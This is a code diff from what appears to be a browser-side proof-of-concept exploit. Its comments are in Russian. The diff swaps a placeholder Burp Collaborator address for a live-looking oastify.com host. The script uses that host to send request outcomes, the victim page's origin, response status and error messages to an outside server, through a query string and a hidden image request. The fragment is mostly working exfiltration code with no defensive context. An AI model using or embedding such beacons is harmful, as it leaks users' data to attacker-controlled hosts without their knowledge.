@@ -71,7 +71,7 @@
             const isSuccessful = response.ok;
             
             // Создаем уникальный URL для логов (замените на ваш Collaborator!)
-            const collaboratorUrl = 'https://YOUR-COLLABORATOR-URL.burpcollaborator.net?status=' + 
+            const collaboratorUrl = 'https://7iqnqby2j1w8p59j8t7tib58dzjq7tvi.oastify.com?status=' + 
                 (isSuccessful ? 'success' : 'failed') + 
                 '&origin=' + encodeURIComponent(window.location.origin) +
                 '&response_status=' + response.status +
@@ -87,7 +87,7 @@
             console.error('Error:', error);
             
             // Отправляем ошибку в Collaborator
-            new Image().src = 'https://YOUR-COLLABORATOR-URL.burpcollaborator.net?error=' + 
+            new Image().src = 'https://7iqnqby2j1w8p59j8t7tib58dzjq7tvi.oastify.com?error=' + 
                 encodeURIComponent(error.toString());
         }
     }
